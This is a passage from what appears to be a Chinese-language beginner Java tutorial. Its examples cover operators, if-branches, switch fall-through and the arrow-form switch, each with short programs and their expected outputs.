java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">System.out.println(<span class="hljs-number">1</span> + <span class="hljs-string">&#x27;a&#x27;</span> );<span class="hljs-comment">//98</span><br>System.out.println(<span class="hljs-string">&#x27;a&#x27;</span> + <span class="hljs-string">&quot;abc&quot;</span> );<span class="hljs-comment">//aabc,有字符串存在就是拼接！</span><br></code></pre></td></tr></table></figure><p>自增自减运算符<code>++,--</code></p><ul><li>单独使用：<code>++</code>和<code>--</code>无论是放在变量前面还是后面，单独写一行结果时一样的</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">int</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-number">10</span>;<br>++a;<span class="hljs-comment">//或者a++</span><br>sout(a)<br><span class="hljs-comment">//11</span><br></code></pre></td></tr></table></figure><ul><li>参与计算</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">int</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-number">10</span>;<br><span class="hljs-type">int</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> a++;<span class="hljs-comment">//先用后加，这里b是10,a是11</span><br><br><span class="hljs-type">int</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-number">10</span>;<br><span class="hljs-type">int</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> ++a;<span class="hljs-comment">//先加后用，这里b是11，a是11</span><br></code></pre></td></tr></table></figure><p>练习：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">x</span> <span class="hljs-operator">=</span> <span class="hljs-number">10</span>;<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">y</span> <span class="hljs-operator">=</span> x++;<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">z</span> <span class="hljs-operator">=</span> ++x;<br><br>        System.out.println(<span class="hljs-string">&quot;x: &quot;</span> + x); <span class="hljs-comment">//12</span><br><br>        System.out.println(<span class="hljs-string">&quot;y: &quot;</span> + y); <span class="hljs-comment">//10</span><br><br>        System.out.println(<span class="hljs-string">&quot;z: &quot;</span> + z); <span class="hljs-comment">//12</span><br><br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>赋值运算符</p><p><img src="/img/javalearn5.png" alt="javalearn5"></p><p>比如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>;<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> <span class="hljs-number">2</span>;<br><br>        a+=b;<span class="hljs-comment">//a+b赋值给a</span><br><br>        System.out.println(<span class="hljs-string">&quot;a: &quot;</span> + a); <span class="hljs-comment">//3</span><br><br>        a-=b;<span class="hljs-comment">//a-b赋值给a</span><br><br>        System.out.println(<span class="hljs-string">&quot;a: &quot;</span> + a);<span class="hljs-comment">//1</span><br><br>        a*=b;<span class="hljs-comment">//a*b赋值给a</span><br><br>        System.out.println(<span class="hljs-string">&quot;a: &quot;</span> + a);<span class="hljs-comment">//2</span><br><br>        a/=b;<span class="hljs-comment">//a/b赋值给a</span><br><br>        System.out.println(<span class="hljs-string">&quot;a: &quot;</span> + a);<span class="hljs-comment">//1</span><br><br>        a%=b;<span class="hljs-comment">//a%b赋值给a</span><br><br>        System.out.println(<span class="hljs-string">&quot;a: &quot;</span> + a);<span class="hljs-comment">//1</span><br>        <br>        <span class="hljs-comment">//注意：+=。-=，*=。/=,%=底层都隐藏着强制类型转换</span><br>        <span class="hljs-type">short</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>;<br>        <span class="hljs-comment">//这时s+=1，不等同于s = s +1，而是s = (short)(s+1)</span><br>        <span class="hljs-comment">//注意short与int相加时会先转成Int，此时s + 1 应该是Int,但却赋值给了一个short类型的变量？</span><br>        <span class="hljs-comment">//</span><br>        <br>    &#125;<br>&#125;<br><br><br><br></code></pre></td></tr></table></figure><p>关系运算符</p><p><img src="/img/javalearn6.png" alt="javalearn6"></p><blockquote><p>注意：关系运算符的结果都是boolean类型，即要么true要么false。</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>;<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> <span class="hljs-number">2</span>;<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>;<br><br>        System.out.println(a == b);<span class="hljs-comment">//false</span><br><br>        System.out.println(a == c);<span class="hljs-comment">//true</span><br><br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>练习：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Scanner;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br><br>        <span class="hljs-type">Scanner</span> <span class="hljs-variable">sc</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(System.in);<br><br>        System.out.println(<span class="hljs-string">&quot;请输入对方分数(0-10)：&quot;</span>);<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">num1</span> <span class="hljs-operator">=</span> sc.nextInt();<br><br>        System.out.println(<span class="hljs-string">&quot;请输入你的分数(0-10)：&quot;</span>);<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">num2</span> <span class="hljs-operator">=</span> sc.nextInt();<br><br>        <span class="hljs-type">boolean</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> num2 &gt;= num1;<br><br>        System.out.println(a);<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>逻辑运算符</p><p><img src="/img/javalearn7.png" alt="javalearn7"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br>        System.out.println(<span class="hljs-literal">true</span> &amp; <span class="hljs-literal">true</span>);<br><br>        System.out.println(<span class="hljs-literal">true</span> &amp; <span class="hljs-literal">false</span>);<br><br>        System.out.println(<span class="hljs-literal">true</span> | <span class="hljs-literal">false</span>);<br><br>        System.out.println(<span class="hljs-literal">false</span> | <span class="hljs-literal">false</span>);<br><br>        System.out.println(<span class="hljs-literal">false</span> ^ <span class="hljs-literal">true</span>);<br><br>        System.out.println(!<span class="hljs-literal">false</span>);<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>短路逻辑运算符</p><p><img src="/img/jajvalearn8.png" alt="jajvalearn8"></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">```<br><br>```java<br><span class="hljs-built_in">public</span> <span class="hljs-keyword">class</span> bianliang1 &#123;<br>    <span class="hljs-built_in">public</span> static <span class="hljs-type">void</span> main(String[] args)&#123;<br>        <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(<span class="hljs-keyword">true</span> &amp;&amp; <span class="hljs-keyword">true</span>);<br><br>        <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(<span class="hljs-keyword">true</span> &amp;&amp; <span class="hljs-keyword">false</span>);<br><br>        <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(<span class="hljs-keyword">true</span> || <span class="hljs-keyword">false</span>);<br><br>        <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(<span class="hljs-keyword">false</span> || <span class="hljs-keyword">false</span>);<br><br>        <span class="hljs-type">int</span> a = <span class="hljs-number">10</span>;<br><br>        <span class="hljs-type">int</span> b = <span class="hljs-number">20</span>;<br><br>        <span class="hljs-type">boolean</span> result = ++a &lt; <span class="hljs-number">5</span> &amp;&amp; ++b &lt; <span class="hljs-number">5</span>;<br><br>        <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(a);<br><br>        <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(b);<br><br>        <span class="hljs-type">boolean</span> result2 = ++a &lt; <span class="hljs-number">5</span> &amp; ++b &lt; <span class="hljs-number">5</span>;<br><br>        <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(a);<br><br>        <span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.println(b);<br>    &#125;<br>&#125;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">true</span><br><span class="hljs-comment">false</span><br><span class="hljs-comment">true</span><br><span class="hljs-comment">false</span><br><span class="hljs-comment">11</span><br><span class="hljs-comment">20</span><br><span class="hljs-comment">12</span><br><span class="hljs-comment">21</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><p>练习：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Scanner;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br>        <span class="hljs-type">Scanner</span> <span class="hljs-variable">sc</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(System.in);<br><br>        System.out.println(<span class="hljs-string">&quot;请输入一个数num1：&quot;</span>);<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">num1</span> <span class="hljs-operator">=</span> sc.nextInt();<br><br>        System.out.println(<span class="hljs-string">&quot;请输入一个数num2：&quot;</span>);<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">num2</span> <span class="hljs-operator">=</span> sc.nextInt();<br><br>        <span class="hljs-type">boolean</span> <span class="hljs-variable">result1</span> <span class="hljs-operator">=</span> num1 == <span class="hljs-number">6</span> || num2 == <span class="hljs-number">6</span>;<br><br>        System.out.println(result1);<br><br>        <span class="hljs-type">boolean</span> <span class="hljs-variable">result2</span> <span class="hljs-operator">=</span> (num1 + num2) % <span class="hljs-number">6</span> == <span class="hljs-number">0</span>;<br><br>        System.out.println(result2);<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="分支结构if"><a href="#分支结构if" class="headerlink" title="分支结构if:"></a>分支结构<code>if</code>:</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Scanner;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br><br>        <span class="hljs-type">Scanner</span> <span class="hljs-variable">sc</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(System.in);<br><br>        System.out.println(<span class="hljs-string">&quot;请输入你口袋里的钱：&quot;</span>);<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">money</span> <span class="hljs-operator">=</span> sc.nextInt();<br><br>        <span class="hljs-keyword">if</span> (money &gt; <span class="hljs-number">100</span>) &#123;<br>            System.out.println(<span class="hljs-string">&quot;111&quot;</span>);<br>        &#125;<span class="hljs-keyword">else</span> &#123;<br>            System.out.println(<span class="hljs-string">&quot;222&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-comment">//练习</span><br><span class="hljs-keyword">import</span> java.util.Scanner;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br><br>        <span class="hljs-type">Scanner</span> <span class="hljs-variable">sc</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(System.in);<br><br>        System.out.println(<span class="hljs-string">&quot;请输入你的号码：&quot;</span>);<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">number</span> <span class="hljs-operator">=</span> sc.nextInt();<br><br>        <span class="hljs-keyword">if</span> (number &lt;=<span class="hljs-number">100</span> &amp;&amp; number &gt;=<span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-keyword">if</span> (number % <span class="hljs-number">2</span>==<span class="hljs-number">1</span>) &#123;<br>                System.out.println(<span class="hljs-string">&quot;请坐在左边&quot;</span>);<br>            &#125;<span class="hljs-keyword">else</span> &#123;<br>                System.out.println(<span class="hljs-string">&quot;请坐在右边&quot;</span>);<br>            &#125;<br>        &#125;<span class="hljs-keyword">else</span> &#123;<br>            System.out.println(<span class="hljs-string">&quot;不符合规定！&quot;</span>);<br>        &#125;<br><br>    &#125;<br>&#125;<br><span class="hljs-comment">//练习</span><br><span class="hljs-keyword">import</span> java.util.Scanner;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br><br>        <span class="hljs-type">Scanner</span> <span class="hljs-variable">sc</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(System.in);<br><br>        System.out.println(<span class="hljs-string">&quot;请输入小明的成绩：&quot;</span>);<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">number</span> <span class="hljs-operator">=</span> sc.nextInt();<br><br>        <span class="hljs-keyword">if</span> (number &lt;=<span class="hljs-number">100</span> &amp;&amp; number &gt;=<span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-keyword">if</span> (number &gt;= <span class="hljs-number">95</span>) &#123;<br>                System.out.println(<span class="hljs-string">&quot;一等奖&quot;</span>);<br>            &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (number &lt;= <span class="hljs-number">94</span> &amp;&amp; number &gt;= <span class="hljs-number">90</span>)&#123;<br>                System.out.println(<span class="hljs-string">&quot;二等奖&quot;</span>);<br>            &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (number &lt;= <span class="hljs-number">89</span> &amp;&amp; number &gt;=<span class="hljs-number">85</span>)&#123;<br>                System.out.println(<span class="hljs-string">&quot;三等奖&quot;</span>);<br>            &#125;<span class="hljs-keyword">else</span> &#123;<br>                System.out.println(<span class="hljs-string">&quot;无奖&quot;</span>);<br>            &#125;<br>        &#125;<span class="hljs-keyword">else</span> &#123;<br>            System.out.println(<span class="hljs-string">&quot;请输入合理的成绩！&quot;</span>);<br>        &#125;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="分支结构switch"><a href="#分支结构switch" class="headerlink" title="分支结构switch"></a>分支结构<code>switch</code></h4><p><img src="/img/javalearn29.png" alt="javalearn29"></p><p><img src="/img/javalearn30.png" alt="javalearn30"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Scanner;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br><br>        <span class="hljs-type">Scanner</span> <span class="hljs-variable">sc</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(System.in);<br><br>        System.out.println(<span class="hljs-string">&quot;请输入面条种类：&quot;</span>);<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">noodles</span> <span class="hljs-operator">=</span> sc.next();<br><br>        <span class="hljs-keyword">switch</span> (noodles)&#123;<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;热干面&quot;</span>:<br>                System.out.println(<span class="hljs-string">&quot;reganmian&quot;</span>);<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;兰州拉面&quot;</span>:<br>                System.out.println(<span class="hljs-string">&quot;lanzhoulamian&quot;</span>);<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;炸酱面&quot;</span>:<br>                System.out.println(<span class="hljs-string">&quot;zhajiangmian&quot;</span>);<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">default</span>:<br>                System.out.println(<span class="hljs-string">&quot;fangbianmian&quot;</span>);<br>                <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/javalearn22.png" alt="javalearn22"></p><h4 id="default的位置和省略"><a href="#default的位置和省略" class="headerlink" title="default的位置和省略"></a>default的位置和省略</h4><ul><li>default可以写在任意位置，也可以省略不写</li></ul><h4 id="case穿透"><a href="#case穿透" class="headerlink" title="case穿透"></a>case穿透</h4><p>发现<code>break</code>会结束整个<code>switch</code>语句。如果没有发现<code>break</code>，那么程序会执行下一个<code>case</code>的语句体，一直遇到<code>break</code>或大括号为止，比如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Scanner;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br><br>        <span class="hljs-type">Scanner</span> <span class="hljs-variable">sc</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(System.in);<br><br>        System.out.println(<span class="hljs-string">&quot;请输入今天是星期几：&quot;</span>);<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">today</span> <span class="hljs-operator">=</span> sc.next();<br><br>        <span class="hljs-keyword">switch</span> (today)&#123;<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;星期一&quot;</span>:<br>                System.out.println(<span class="hljs-string">&quot;reganmian&quot;</span>);<br>                <span class="hljs-comment">//break;</span><br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;星期二&quot;</span>:<br>                System.out.println(<span class="hljs-string">&quot;lanzhoulamian&quot;</span>);<br>                <span class="hljs-comment">//break;</span><br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;星期三&quot;</span>:<br>                System.out.println(<span class="hljs-string">&quot;zhajiangmian&quot;</span>);<br>                <span class="hljs-comment">//break;</span><br>            <span class="hljs-keyword">default</span>:<br>                System.out.println(<span class="hljs-string">&quot;fangbianmian&quot;</span>);<br>                <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/javalearn23.png" alt="javalearn23"></p><h4 id="switch的新特性"><a href="#switch的新特性" class="headerlink" title="switch的新特性"></a>switch的新特性</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.Scanner;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br><br>        <span class="hljs-type">Scanner</span> <span class="hljs-variable">sc</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(System.in);<br><br>        System.out.println(<span class="hljs-string">&quot;请输入今天是星期几：&quot;</span>);<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">today</span> <span class="hljs-operator">=</span> sc.next();<br><br>        <span class="hljs-keyword">switch</span> (today)&#123;<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;星期一&quot;</span> -&gt; &#123;<br>                System.out.println(<span class="hljs-string">&quot;今天是星期一&quot;</span>);<span class="hljs-comment">//去掉大括号直接合并成一行也行</span><br>            &#125;<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;星期二&quot;</span> -&gt; &#123;<br>                System.out.println(<span class="hljs-string">&quot;今天是星期二&quot;</span>);<br>            &#125;<br><br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;星期三&quot;</span> -&gt; &#123;<br><br>                System.out.println(<span 